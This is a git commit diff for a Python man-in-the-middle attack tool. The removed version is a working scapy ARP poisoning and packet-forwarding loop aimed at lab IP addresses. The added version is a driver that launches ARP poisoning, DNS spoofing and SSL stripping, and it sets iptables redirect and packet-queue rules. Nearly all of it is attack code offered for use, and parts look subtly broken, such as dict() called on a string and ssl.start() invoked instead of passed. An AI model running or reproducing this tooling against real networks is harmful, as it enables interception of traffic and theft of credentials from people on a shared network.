2b452e23e8fd285c4427fe62470df34262eb7165
Sandervanheesch <64254877+Sandervanheesch@users.noreply.github.com>
2021-06-29 22:00:01 +0200

    Update main.py

--- main.py
+++ main.py
@@ -1,64 +1,167 @@
-from scapy.arch import get_if_hwaddr
-from scapy.config import conf
-from scapy.layers.l2 import Ether, ARP, getmacbyip
-from scapy import route
-from scapy.sendrecv import sendp, send, sniff
-import time
-import threading
+import getopt
+import multiprocessing
+import os
 import sys
+import time
 
-# TODO: make this as an input
-from scapy.utils import wrpcap
+from scapy.arch import get_if_addr
+from scapy.config import conf
 
-tgt_ip = "192.168.56.101"
-ipM2 = "192.168.56.102"
-my_ip = "192.168.56.103"
-gw_ip = ipM2 #conf.route.route("0.0.0.0")[2]
-packet_count = 1
-
-
-def restore_network(gateway_ip, target_ip):
-    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway_ip, hwsrc=getmacbyip(target_ip), psrc=target_ip),
-         verbose=False,
-         count=5)
-    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip, hwsrc=getmacbyip(gateway_ip), psrc=gateway_ip),
-         verbose=False,
-         count=5)
+from arpPoison import ArpPoison
+from dnsSpoof import DnsSpoof
+from sslStrip import SSLStrip
 
 
-def arp_poison(gateway_ip, target_ip):
-    print("[*] Started ARP poison attack [CTRL-C to stop]")
+def stop_process(process):
+    process.join(5)
+    name = process.name
+
+    if process.is_alive():
+        process.terminate()
+        print "[*] Terminated " + name + " Process"
+
+    if not process.is_alive():
+        print "[*] " + name + " exited successfully"
+    else:
+        print "[*] " + name + " failed to exit: use CTRL-Z to kill"
+
+
+def help():
+    print 'Arp Poison + DNS spoof + SSL Strip. Usage:'
+    print ''
+    print 'main.py -t <target ip>'
+    print ''
+    print 'Arguments:'
+    print "-t <target ip>, --target=<target ip>             Specify target ip"
+    print ''
+    print 'Optional arguments:'
+    print "-g <gateway ip>  , --gateway=<gateway ip>        Specify gateway ip, default gateway used otherwise"
+    print "-i <interface> , --interface <interface>         Specify interface, default interface used otherwise"
+    print "-d <map url->ip> , --dns=<map url->ip>           Start dns spoof attack on specified url"
+    print "-a , --dnsall                                    Start dns spoof attack on all dns responses"
+    print "-s , --ssl                                       Start ssl strip attack"
+    print "-q <queue number> , --queuenum=<queue number>    Queue number for netfilterqueue used for dns attack, " \
+          "default is 0"
+    print "-h , --help                                      Print this help message."
+
+
+def main(argv):
+    target = ""
+    gateway = conf.route.route("0.0.0.0")[2]
+    interface = conf.iface
+    do_dns_attack = False
+    do_ssl_strip = False
+    queue_num = 0
+    super_dns_attack = False
+    dns_dic = ''
+
     try:
-        gateway_mac = getmacbyip(gateway_ip)
-        target_mac = getmacbyip(target_ip)
-        while True:
-            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip), verbose=False)
-            send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip), verbose=False)
-            time.sleep(2)
+        # process arguments
+        try:
+            opts, args = getopt.getopt(argv, "ht:g:i:d:a:sq:", ["help", "target=", "gateway=", "interface=", "dns=",
+                                                              "dnsall=", "ssl", "queuenum="])
+        except getopt.GetoptError:
+            help()
+            sys.exit(2)
+        for opt, arg in opts:
+            if opt in ("-h", "--help"):
+                help()
+                sys.exit()
+            elif opt in ("-t", "--target"):
+                target = arg
+            elif opt in ("-g", "--gateway"):
+                gateway = arg
+            elif opt in ("-i", "--interface"):
+                interface = arg
+            elif opt in ("-d", "--dns"):
+                do_dns_attack = True
+                dns_dic = dict(arg)
+            elif opt in ("-a", "--dnsall"):
+                do_dns_attack = True
+                super_dns_attack = True
+                if arg is "":
+                    dns_dic = str(get_if_addr(interface))
+                else:
+                    dns_dic = str(arg)
+            elif opt in ("-s", "--ssl"):
+                do_ssl_strip = True
+                if do_dns_attack:
+                    print 'DNS and SSL attacks are both selected. At the moment these do not work together. ' \
+                          'DNS spoofing will be turned off'
+                    do_dns_attack = False
+            elif opt in ("-q", "--queuenum"):
+                queue_num = arg
+
+        if target is '':
+            print "No Target Specified"
+            print ''
+            help()
+            sys.exit()
+
+        # iptable rules
+        os.system('iptables -P FORWARD DROP')
+
+        if do_dns_attack:
+            os.system('iptables -I FORWARD -i ' + interface + ' -j NFQUEUE --queue-num ' + str(queue_num))
+
+        if do_ssl_strip:
+            os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000")
+
+        os.system('iptables -A FORWARD -i ' + interface + ' -j ACCEPT')
+
+        # --- ARP ---
+        arp = ArpPoison(target, gateway, interface)
+
+        # Start ARP process
+        arp_process = multiprocessing.Process(target=arp.start, name="ARP Poison")
+        arp_process.start()
+        print "[*] Started ARP Process"
+
+        # --- DNS ---
+        if do_dns_attack:
+            dns = DnsSpoof(interface, super_dns_attack, dns_dic)
+
+            # Start DNS process
+            dns_process = multiprocessing.Process(target=dns.start, args=[queue_num],
+                                                  name="DNS Spoof")
+            dns_process.start()
+            print "[*] Started DNS Process"
+
+        # --- SSL ---
+        if do_ssl_strip:
+            ssl = SSLStrip()
+
+            # Start SSL process
+            ssl_process = multiprocessing.Process(target=ssl.start(), name="SSL Strip")
+            ssl_process.start()
+
+        time.sleep(1000000000000)
+
     except KeyboardInterrupt:
-        print("[*] Stopped ARP poison attack. Restoring network")
-        restore_network(gateway_ip, target_ip)
+        # --- Stopping Attacks ---
+        # Stop arp
+        stop_process(arp_process)
+
+        # Stop Dns
+        if do_dns_attack:
+            stop_process(dns_process)
+
+        if do_ssl_strip:
+            stop_process(ssl_process)
+
+        # Remove iptable rules
+        if do_dns_attack:
+            os.system('iptables -D FORWARD -i ' + interface + ' -j NFQUEUE --queue-num ' + str(queue_num))
+
+        if do_ssl_strip:
+            os.system("iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000")
+
+        os.system('iptables -D FORWARD -i ' + interface + ' -j ACCEPT')
+        print "[*] Removed iptable rules"
+
+        # exit
+        sys.exit(0)
 
 
-# ARP poison thread
-poison_thread = threading.Thread(target=arp_poison, args=(gw_ip, tgt_ip))
-poison_thread.start()
-
-# Sniff traffic and write to file. Capture is filtered on target machine
-try:
-    sniff_filter = "ip host " + tgt_ip
-    print(f"[*] Starting network capture. Packet Count: {packet_count}. Filter: {sniff_filter}")
-    while True:
-        packets = sniff(filter=sniff_filter, iface="enp0s3", count=packet_count)
-        #print(f"[*] Captured one packet")
-        #print(f"[*] Target mac: {getmacbyip(tgt_ip)}. source mac: {packets[0][Ether].src}")
-        if packets[0][Ether].src == getmacbyip(tgt_ip):
-            packets[0][Ether].dst = getmacbyip(gw_ip)
-        else:
-            packets[0][Ether].dst = getmacbyip(tgt_ip)
-        packets[0][Ether].src = get_if_hwaddr("enp0s3")
-        #print(f"[*] Modified one packet: dst: {packets[0][Ether].dst} and src: {packets[0][Ether].src }")
-        sendp(packets, iface="enp0s3", verbose=False)
-except KeyboardInterrupt:
-    print(f"[*] Stopping network capture..Restoring network")
-    restore_network(gw_ip, tgt_ip)
+if __name__ == '__main__':
+    main(sys.argv[1:])
